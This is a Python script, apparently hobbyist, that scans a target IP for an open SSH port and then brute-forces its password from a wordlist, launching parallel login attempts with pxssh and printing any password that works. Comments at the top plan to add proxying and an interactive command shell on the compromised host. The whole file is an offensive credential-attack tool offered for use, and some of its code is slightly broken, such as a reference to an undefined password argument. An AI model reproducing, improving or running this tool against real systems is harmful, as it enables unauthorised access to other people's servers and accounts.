import socket
import argparse
from pexpect import pxssh
import time
import pexpect
import threading
import os
import queue
from multiprocessing import Process

# after inside the SSH server try to make a While True connection and run any command like you normally would
# add a proxy before connecting to the portscanner
# bruteforce the file
# MAKE A MAX QUEUE SIZE

class Parser:
	def __init__(self):
		self.args = argparse.ArgumentParser()
		self.args.add_argument("--target", help="IP to scan for an open SSH port", required=True)
		self.args.add_argument("--username", help="Username you want to log in with")
		self.args.add_argument("--file", help="The file you want to use to bruteforce the password", type=self.validate_file)

		self.args_parsed = self.args.parse_args()

	def get_target_ip(self):
		return self.args_parsed.target

	def get_username(self):
		return self.args_parsed.username 

	def get_password(self):
		return self.args_parsed.password

	def get_file(self):
		return self.args_parsed.file

	def validate_file(self, file):
		if not os.path.isfile(file):
			print(f"[-] Invalid file => {file}")
			exit()
		return file

class PortScan(Parser):
	def __init__(self):
		super().__init__()
		self.target_ip = self.get_target_ip()

	def scan_ssh_port(self):
		socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		socket_connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		print(f"[+] Scanning for an open SSH port on [==>] {str(self.target_ip)}")

		if socket_connection.connect_ex((self.target_ip, 22)) == 0:
			return True
		return False

class Client():
	def __init__(self):
		pass

	def ssh_commands(self, command):
		directory_list = ["cd", "dir", "ls", "cd .."]
		self.ssh_client.sendline(command)
		self.ssh_client.prompt()

		if command in directory_list:
			print(os.getcwd())
		return self.ssh_client.before.decode()

	def ssh_main(self, host_name, username, password):
		try:
			self.ssh_client = pxssh.pxssh()
			self.ssh_client.login(host_name, username, password)
			print(f"\n[+] Password is --> {password}")
			self.ssh_client.close()
		except pexpect.pxssh.ExceptionPxssh:
			pass

class Queue(queue.Queue, Client):
	def __init__(self):
		queue.Queue.__init__(self)
		self.maxsize = 50

	def read_word_list(self, file):
		with open(file, "r") as f:
			data = f.readlines()
			f.close()

		for passwords in data:
			passwords = passwords.strip()
			yield passwords

	def put_que(self, host_name, username, file):
		count = 0
		get_files = self.read_word_list(file)

		for password in get_files:
			self.put(password)
			if self.qsize() == 50:
				while not self.empty():
					t = Process(target=self.ssh_main, args=(host_name, username, self.get()), daemon=True)
					t.start()
					count += 1
					print(f"\rAttempts: {str(count)}", flush=True, end="")

					if self.empty():
						with self.mutex:
							self.queue.clear()


if __name__ == '__main__':
	check_ssh_port = PortScan().scan_ssh_port()
	time.sleep(0.1)

	if not check_ssh_port:
		print("[-] SSH port 22 is closed")
		exit()

	if check_ssh_port:
		print("[+] Port open")
		target = Parser().get_target_ip()
		file = Parser().get_file()
		username = Parser().get_username()


		Queue().put_que(target, username, file)
